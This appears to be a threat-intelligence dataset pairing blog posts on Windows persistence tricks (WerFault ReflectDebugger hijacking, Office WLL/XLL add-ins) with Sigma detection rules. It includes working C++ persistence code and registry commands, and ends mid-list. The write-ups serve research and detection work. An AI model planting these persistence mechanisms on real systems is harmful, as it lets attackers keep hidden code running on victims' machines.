PowerShell\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Windows\\system32> .\\ViewFault.exe -pr 1\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\\\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  PS C:\\Windows\\system32> cd Z:\\2022-11-02-malware-pers-18\n  PS Z:\\2022-11-02-malware-pers-18> dir\n  \n  Directory: Z:\\2022-11-02-malware-pers-18\n  \n  Mode         LastWriteTime            Length Name\n  ----         -------------            ------ ----\n  ------       11/2/2022  7:35 AM       232 hack.cpp\n  ------       11/2/2022  7:55 AM       15360 pers.exe\n  ------       11/2/2022  7:54 AM       148484 hack.exe\n  ------       11/2/2022  7:54 AM       1049 pers.cpp\n  \n  PS Z:\\2022-11-02-malware-pers-18> .\\hack.exe\n  \n  Meow-meow!\n  [OK]\n```\n\nAlso, check registry keys which are used for persistence logic:\n\n```\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n```\n\n```image\nAlt: pers\nDescription: The image displays a Windows PowerShell interface showing a series of commands executed by the user. It includes commands querying the Windows registry related to the Windows Error Reporting and a list of files in a directory. The output indicates the existence of two executables: 'hack.exe' and 'pers.exe', along with their associated source code files. The highlighted section shows a specific registry entry under 'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', which contains background processes including 'OneDrive.exe' and 'Process Hacker 2.exe'. This context is relevant for understanding malware persistence techniques and registry manipulation.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Windows\\system32> .\\WerFault.exe -pr 1\n  PS C:\\Windows\\system32> .\\WerFault.exe -pr 1\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  ERROR: The system was unable to find the specified registry key or value.\n  PS C:\\Windows\\system32> cd Z:\\2022-11-02-malware-pers-18\\\n  PS Z:\\2022-11-02-malware-pers-18> dir\n  \n  Directory: Z:\\2022-11-02-malware-pers-18\n  \n  Mode         LastWriteTime            Length Name\n  ----         -------------            ------ ----\n  ------       11/2/2022  7:35 AM       232 hack.cpp\n  ------       11/2/2022  7:55 AM       15360 pers.exe\n  ------       11/2/2022  7:54 AM       14848 hack.exe\n  ------       11/2/2022  7:34 AM       1049 pers.cpp\n  \n  PS Z:\\2022-11-02-malware-pers-18> .\\hack.exe\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n```\n\nThen, run\n\n```\npers.exe\n```\n\nand check Windows Error Reporting registry key again:\n\n```\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n```\n\n```image\nAlt: pers\nDescription: The image shows a Windows PowerShell interface where various commands are executed related to Windows Error Reporting and malware persistence. The highlighted section indicates a successful change in the registry key for the ReflectDebugger under HKEY_LOCAL_MACHINE, showing that the 'hack.exe' application has been registered. There are error messages from previous commands indicating missing registry keys, followed by successful queries demonstrating the modifications made by the malware.\nTranscription: |\n  [SC] QueryServiceConfig SUCCESS\n  \n  SERVICE_NAME: TrustedInstaller\n          TYPE               : 10  WIN32_OWN_PROCESS\n          STATE              : 3  DEMAND_START\n          ERROR_CONTROL      : 1  NORMAL\n          BINARY_PATH_NAME   : C:\\Windows\\servicing\\TrustedInstaller.exe\n          LOAD_ORDER_GROUP   : ProfSvc_Group\n  \n  Administrator: Windows PowerShell\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\\"\n  ERROR: The system was unable to find the specified registry key or value.\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n  PS Z:\\2022-11-02-malware-pers-18> WerFault.exe -pr 1\n  PS Z:\\2022-11-02-malware-pers-18> .\\pers.exe\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n```\n\nAs you can see, the key value is edited and we can check correctness via running:\n\n```\nWerFault.exe -pr 1\n```\n\n```image\nAlt: pers\nDescription: The image displays a screenshot of a Windows PowerShell interface showing command outputs related to Windows Error Reporting. The commands are querying specific registry keys and listing processes. Additionally, a message box with the text \"Meow-meow!\" is shown, suggesting the successful execution of a script or malware that interacts with the Windows Error Reporting feature. The top of the image includes code indicating the inclusion of a Windows header and a function definition for displaying the message box.\nTranscription: |\n  meow-meow:messagebox\n  author: @ccomelon<--\n  */\n  #include <windows.h>\n  \n  int WINAPI winMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n      MessageBox(NULL, \"Meow-meow!\" , \" ^_^ \", MB_OK);\n      return 0;\n  }\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\\ReflectDebugger\"\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-17\\hack.exe\n  \n  PS Z:\\2022-11-02-malware-pers-18> Werfault.exe -pr 1\n  \n  PS Z:\\2022-11-02-malware-pers-18> Werfault.exe -pr 1\n```\n\nThen, logout and login.\n\nand after a few seconds our `meow-meow` messagebox is popped-up as expected:\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of a Windows 10 desktop environment with a pop-up windows says \"Meow-meow!\"\n```\n\nYou can check the properties of `hack.exe` via Process Hacker 2:\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of the Process Hacker application displaying the properties of a process named `hack.exe`. It includes details such as the command line used to start the process, the current directory, the start time, the PEB address, and the parent process status. Additionally, there is a pop-up message box from the `hack.exe` application that says \"Meow-meow!\" indicating successful execution. The background contains a list of other processes running on the system, showcasing an environment likely set up for malware testing or demonstration.\nTranscription: |\n  Process Hacker [WINDOWS-V9HNK33\\User]\n  \n  Process: hack.exe (4116) Properties\n  \n  General\n    File\n      N/A\n      (UNVERIFIED)\n      Version: N/A\n      Image file name: \\\\BoxSvr\\shared\\2022-11-02-malware-pers-18\\hack.exe\n  \n  Process\n    Command line: Z:\\2022-11-02-malware-pers-18\\hack.exe 2556\n    Current directory: C:\\Windows\\system32\n    Started: 49 seconds ago (8:14:10 AM 11/2/2022)\n    PEB address: 0x382f64d000\n    Parent: Non-existent process (2556)\n    Mitigation policies: DEP (permanent); ASLR (high entropy)\n    Protection: None\n```\n\nAlso, pay attention that admin privileges are required for hijacking Windows Error Reporting, but for persistence, we use low-level privileges:\n\n```\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" -Name \"ReflectDebugger\"\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"meow\"\n```\n\n```image\nAlt: pers\nDescription: The image displays a split-screen view featuring a C++ code snippet on the left side and a Windows PowerShell interface on the right side. The code outlines functions related to malware persistence by manipulating Windows registry keys. The PowerShell window shows command outputs querying registry values, specifically for 'ReflectDebugger' and entries under 'CurrentVersion\\Run'. Additionally, a pop-up message box titled 'Meow-meow!' appears, indicating the execution of the malicious application. This visual effectively illustrates the technical process of malware persistence in a Windows environment.\nTranscription: |\n  cpp\n  // pers.cpp\n  // windows_persistense via WerFault.exe\n  // author: @cocomelonc\n  // https://cocomelonc.github.io/malware/2022/11/02/malware-pers-17.html\n  #include <windows.h>\n  #include <string.h>\n  \n  int main(int argc, char* argv[]) {\n      HKEY hkey = NULL;\n  \n      // malicious app\n      const char* exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n      // hijacked app\n      const char* wf = \"WerFault.exe -pr 1\";\n  \n      // set evil app\n      LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\", 0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0, REG_SZ, (unsigned char*)exe, strlen(exe) + 1);\n          RegCloseKey(hkey);\n      }\n  \n      // startup\n      res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"wf\", 0, REG_SZ, (unsigned char*)wf, strlen(wf) + 1);\n          RegCloseKey(hkey);\n      }\n      return 0;\n  }\n  ```\n  \n  ```\n  PS C:\\Users\\User> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n  \n  PS C:\\Users\\User> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n      wf    REG_SZ    WerFault.exe -pr 1\n  ```\n  \n  ```\n  =^.^=\n  Meow-meow!\n  [OK]\n```\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of a Windows PowerShell terminal in a virtual machine environment. The terminal displays several commands related to querying and modifying Windows registry keys, specifically targeting the Windows Error Reporting and CurrentVersion Run sections. Key details include attempts to query registry settings, and an error message indicating that requested registry access is not allowed, highlighted in red. This suggests a focus on malware persistence techniques through registry manipulation.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Users\\user> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  \n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n      RefCount    REG_SZ    1\n      v2:2022-11-02-malware-pers-18\\hack.exe\n  \n  PS C:\\Users\\user> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\user\\AppData\\Local\\Microsoft\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n  \n  PS C:\\Users\\user> Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"wf\"\n  \n  PS C:\\Users\\user> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\user\\AppData\\Local\\Microsoft\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n  \n  PS C:\\Users\\user> Remove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" -Name \"ReflectDebugger\"\n  Remove-ItemProperty : Requested registry access is not allowed.\n  At line:1 char:1\n  + Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows E ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : PermissionDenied: (HKEY_LOCAL_MACH...Reporting\\Hangs:String) [Remove-ItemPr\n     opperty], SecurityException\n      + FullyQualifiedErrorId : System.Security.SecurityException,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand\n  \n  PS C:\\Users\\user> _\n```\n\n```image\nAlt: pers\nDescription: The image shows a Windows PowerShell interface running on a virtual machine with an Administrator prompt. It displays a series of commands related to Windows Error Reporting and registry manipulation. The commands include 'Remove-ItemProperty' for removing a registry key, and 'reg query' commands for checking specific registry paths. The background indicates that this is part of a demonstration related to malware persistence techniques, specifically focusing on the hijacking of the Windows Error Reporting system.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Windows\\system32> Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs' -Name 'ReflectDebugger'\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\\"\n  PS C:\\Windows\\system32> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n  \n  PS C:\\Windows\\system32>\n```\n\nWhich can you notice if you decide to “return everything back to its place”.\n\nSo, as you can see everything worked perfectly! =^..^=\n\n> The next one was supposed to be 17, but it will come out together with the third part about the theft of tokens. I couldn’t understand for 10 minutes why it doesn’t work for me :)\n\n```image\nAlt: pers\nDescription: The image displays a PowerShell window running on a Windows 10 virtual machine. It shows a series of commands related to the Windows Registry, particularly focusing on the 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs' key. The commands include attempts to create and query registry entries, specifically the 'ReflectDebugger' entry. The output highlights errors encountered during these operations, indicating that certain registry keys do not exist. The output also confirms the presence of the 'ReflectDebugger' entry with a corresponding path to a malicious executable ('hack.exe'). Overall, the image provides detailed command-line interactions that illustrate the process of manipulating Windows Error Reporting for malicious persistence.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n  \n  Name                Type      Data\n  (Default)          REG_SZ    (value not set)\n  ReflectDebugger     REG_SZ    Z:\\2022-11-02-malware-pers-17\\hack.exe\n  \n  Administrator: Windows PowerShell\n  PS Z:\\2022-11-02-malware-pers-18> New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs' -Name 'ReflectDebugger' -Value 'Z:\\2022-11-02-malware-pers-17\\hack.exe'\n  New-ItemProperty : The property already exists.\n  At line:1 char:1\n  + New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Err ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : ResourceExists: (HKEY_LOCAL_MACH...Reporting:Hangs:String) [New-ItemProperty], IOExcepti\n      + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.NewItemPropertyCommand\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  ERROR: The system was unable to find the specified registry key or value.\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger\"\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\n  ReflectDebugger     REG_SZ    Z:\\2022-11-02-malware-pers-17\\hack.exe\n```\n\nI don’t know if any APT in the wild used this tactic and trick, but, I hope this post spreads awareness to the blue teamers of this interesting technique especially when creating software, and adds a weapon to the red teamers' arsenal.\n\n> This is a practical case for educational purposes only.\n\nMSDN Windows Error Reporting\nDLL hijacking\nDLL hijacking with exported functions\nMalware persistence: part 1\nSource code in GitHub\n\n---\n\n**Tags:**\n- malware\n- persistence\n- red team\n- win32api\n- windows\n\n**Categories:**\n- malware\n\n**Updated:**\nNovember 2, 2022",
    "sigma_rule": {
      "title": "Potential WerFault ReflectDebugger Registry Value Abuse",
      "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
      "related": [
        {
          "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potential WerFault \"ReflectDebugger\" registry value abuse for persistence.",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|endswith": "\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_reflectdebugger.yml",
    "id": "1004"
  },
  {
    "url": "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/",
    "markdown": "# Beyond good ol’ Run key, Part 85\n\nPosted on 2018-08-31\n\nThis is a LOLbinish 2-stage persistence trick. One where we add startup items to point to OS binaries, and – while they will be ignored by many users and security solutions (at least at first glance) – they will be launching the second stage of the persistence mechanism for us…\n\nMany people who use win7-win10 know that the Werfault.exe process is all over the place. It’s a process ‘repairer’ or ‘fixer’ that handles crashes or other unpleasant activities of other processes. It turns out you can launch werfault.exe with a number of specific command line arguments. One of these modes is called ‘reflective debugger’ and is very interesting to us. To launch werfault in this mode we need to provide the following parameters:\n\n- werfault.exe -pr <somevalue>\n\nAnd how does it load the debugger?\n\nBy reading:\n\n- HKLM\\Software\\Microsoft\\Windows\\\n  Windows Error Reporting\\Hangs\\ReflectDebugger=\n  <path>\n\nand… executing it.\n\n```image\nAlt: Reflective Debugger\nDescription: The image displays a screenshot from the Sysinternals Process Monitor tool. It shows a detailed log of events related to the 'werfault.exe' process. The entry includes information such as the time of day, process ID (PID), operation type (RegQueryValue), the registry path queried (HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger), the result of the operation (SUCCESS), and additional details about the registry value type and data. This demonstrates the reflective debugger functionality mentioned in the CTI context.\nTranscription: |\n  | Time of Day        | Process      | PID  | Operation     | Path Result                                                                           | Detail                                                       |\n  | ------------------ | ------------ | ---- | ------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------------------ |\n  | 3:39:59.8600221 PM | werfault.exe | 7140 | RegQueryValue | HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger SUCCESS | Type: REG_SZ, Length: 58, Data: c:\\windows\\system32\\calc.exe |\n```\n\nThat’s it.\n\nSo if we add a Run key like this:\n\n```image\nAlt: Reflective Debugger Run Key\nDescription: The image displays a Windows Registry Editor window focused on the 'Run' key under 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'. It shows an entry for 'werfault.exe', which is associated with Windows Problem Reporting. The entry includes details such as the size (424 KB), the version (10.0.17134.48), and the command line argument '-pr 1'. This information is relevant for understanding persistence mechanisms in malware, as it illustrates how 'werfault.exe' can be used to execute commands at user login.\nTranscription: |\n  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  --------------------------------------------------\n  | Name | Data                             |\n  | ---- | -------------------------------- |\n  | foo  | werfault.exe                     |\n  |      | Size: 424 K                      |\n  |      | Windows Problem Reporting        |\n  |      | Time: 11/12/1969 11:32 AM        |\n  |      | Microsoft Corporation            |\n  |      | Version: 10.0.17134.48           |\n  |      | c:\\windows\\system32\\werfault.exe |\n  |      | werfault.exe -pr 1               |\n  ------------------------------------------\n```\n\n– it will in the end launch our program of choice when the user logs on.",
    "sigma_rule": {
      "title": "Potential WerFault ReflectDebugger Registry Value Abuse",
      "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
      "related": [
        {
          "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potential WerFault \"ReflectDebugger\" registry value abuse for persistence.",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|endswith": "\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_reflectdebugger.yml",
    "id": "1005"
  },
  {
    "url": "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
    "markdown": "# Add-In Opportunities for Office Persistence\n\n21 April, 2017\n\n## Introduction\n\nOne software product that attackers will almost certainly find in the environments that they're targeting is Microsoft Office. Office applications due to this ubiquity present a consistent source of opportunity for persistence mechanisms.\n\nThis post will explore various opportunities for gaining persistence through native Microsoft Office functionality. It was inspired by Kostas Lintovois’ similar work which identified ways to persist in transient Virtual Desktop Infrastructure (VDI) environments through adding a VBA backdoor to Office template files (“One Template to Rule ‘Em All”).\n\nThe following opportunities for Office-based persistence will be discussed, along with the relative benefits and disadvantages of each (from a red team perspective as we’re talking about obtaining persistence):\n\n1. WLL and XLL add-ins for Word.\n2. VBA add-ins for Excel and PowerPoint.\n3. COM add-ins for all Office products.\n4. Automation add-ins for Excel.\n5. VBA editor (VBE) add-ins for all VBA using Office products.\n6. VSTO add-ins for all Office products.\n\nThe described persistence techniques were tested with Office 2013 running on Windows 7, 8.1, and 10.\n\n## WLL and XLL “Add-Ins” for Word and Excel\n\nKey to the work by Kostas and others on persistence using Office templates was the concept of “Trusted Locations”. Files located here containing VBA code are not subject to the standard restrictions imposed by the macro settings, and the code will be executed without warning even if macros are disabled. Further research, however, found that certain trusted locations to which a typical standard user has write privileges could also be used to host DLL-based add-ins.\n\n### WLL “Add-Ins” for Word\n\nThe three default locations for Word are shown below. It can be seen that the purposes of the trusted locations are split between “templates” and “StartUp” functionality.\n\n```image\nAlt: WLL1\nDescription: The image shows a screenshot of the trusted locations settings in Microsoft Word 2013. It highlights three specific paths designated as trusted sources for opening files, with a focus on the 'StartUp' directory. This directory is indicated as a default location for Word 2013 and is crucial for the operation of WLL add-ins, which can lead to arbitrary code execution when Word starts.\nTranscription: |\n  Trusted Locations\n  \n  Warning: All these locations are treated as trusted sources for opening files. If you change or add a location, make sure that the new location is secure.\n  \n  User Locations\n  \n  Path                                                                      Description\n  C:\\...AppData\\Roaming\\Microsoft\\Templates\\                                Word 2013 default location: User Templates\n  C:\\...Files (x86)\\Microsoft Office\\Templates\\                             Word 2013 default location: Application Tem...\n  C:\\...ata\\Roaming\\Microsoft\\Word\\Startup\\                                 Word 2013 default location: StartUp\n  \n  Policy Locations\n```\n\nFurther investigation of this “StartUp” trusted location found that it could host “Word Add-Ins” of a “*.wll” extension. This is an archaic extension dating back to the days of Word 97 but appears to still be supported, and there’s little documentation on how to actually create such a file. After some research, it was identified that a “*.wll” file is essentially a DLL with additional “Office-specific extensions”. This means it supports basic DLL functionality, and therefore you can just rename a “*.dll” to a “*.wll”, put it in the “StartUp” trusted location which defaults to a location within the user’s home directory, and get arbitrary code execution when Word starts, all from a low privileged user.\n\nAn example of this can be seen below, where a WLL add-in launches \"calc.exe\", and can be seen running as a child of the Word process, \"WINWORD.EXE\".\n\n```image\nAlt: calc-process-tree\nDescription: The image is a screenshot of a task management interface displaying the process tree of two applications: 'WINWORD.EXE' (Microsoft Word) and 'calc.exe' (Windows Calculator). The image includes various metrics for these processes, such as CPU usage, private bytes allocated, and working set memory. Each process is accompanied by its respective process ID (PID), description, company name, and integrity level. This information illustrates the relationship between the two processes, highlighting the execution of 'calc.exe' as a child process of 'WINWORD.EXE', relevant to the discussion of WLL add-ins for persistence in Microsoft Word.\nTranscription: |\n  Process         | CPU  | Private Bytes | Working Set | PID  | Description        | Company Name         | Integrity\n  -----------------------------------------------------------------------------------------------------------\n  WINWORD.EXE     | 0.68 | 19,928 K      | 44,764 K    | 2100 | Microsoft Word     | Microsoft Corporation | Medium\n    calc.exe      | 0.07 | 7,156 K       | 13,640 K    | 4968 | Windows Calculator | Microsoft Corporation | Medium\n```\n\nFor anyone testing this with DLLs generated through Metasploit's \"msfvenom\" you’ll find that the payload gets executed when Word starts but Word then crashes. I found that constructing a bare bones C++ DLL that executed code directly within DllMain resolved the issue and allowed Word to continue execution.\n\nOne interesting behavior of Word for WLL add-ins is that despite being loaded automatically, and their containing code executed, Word lists them as an “inactive” add-in. Furthermore, and potentially because of this, disabling add-ins within Word’s Trust Center does not disable WLL add-ins.\n\n```image\nAlt: WLL3\nDescription: The image depicts a screenshot of the 'Add-Ins' section within Microsoft Word. It shows a list of inactive application add-ins, highlighting an entry named 'InconspicuousWLLAddIn.wll', indicating its file path and type as a Word Add-in. This visual is relevant to the context of Word add-ins and their potential security implications, as it illustrates how certain add-ins can be listed as inactive while still being present in the system.\nTranscription: |\n  Inactive Application Add-ins\n  \n  InconspicuousV4LAddIn.vll      C:\\...LAddIn.vll      Word Add-in\n```\n\n### XLL “Add-Ins” for Excel\n\nExcel has a similar means of extending its functionality using DLLs which are known as XLL add-ins, and have the “*.xll” extension. Unlike WLL add-ins which are automatically loaded when Word opens, Excel needs to be configured to use an XLL add-in through adding a property to an existing registry key. This key is located at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\Excel\\Options\n```\n\nAn “OPEN” property should be added which contains the value of “/R FileNameOfAddIn.xll”.\n\n```image\nAlt: XLL1\nDescription: The image shows a screenshot of a Windows Registry Editor window displaying a specific key related to Excel add-ins. The highlighted section shows the 'OPEN' property under the registry key path corresponding to Excel options, indicating that an XLL add-in is configured to load by specifying its filename. This visual directly relates to the context provided, illustrating how XLL add-ins are set up in Excel.\nTranscription: |\n  OPEN\n  REG_SZ\n  /R XLLAddIn.xll\n```\n\nA full path does not need to be specified, as Excel defaults to looking in “%appdata%\\Microsoft\\AddIns” for the add-in file. Interestingly, this location is not specified in the trusted locations as was the case with WLL add-ins. This is potentially because the trusted locations are primarily focused on providing security controls around VBA execution.\n\nThe way that Excel uses XLL add-ins also differs from the way Word uses WLL add-ins. For each configured XLL add-in, Excel will look for exported functions in the DLL and call them as appropriate. For example, Excel will look for and call a function with the name of “xlAutoOpen” when the process first loads. This function as the name suggests mimics the behavior of VBA’s “Auto_Open()”.\n\nUnlike WLL add-ins, XLL add-ins are listed as being “active” within Excel’s add-in manager, and can be prevented from loading by disabling add-ins within the Trust Center.\n\n#### Benefits\n\n1. No administrative rights needed to write to the user’s “StartUp” location, or configure registry keys.\n2. Automatically loaded for Word, and only minimal registry edits are required for Excel.\n3. WLL add-ins are not prevented from loading by enabling “Disable all Application Add-ins”. This does not 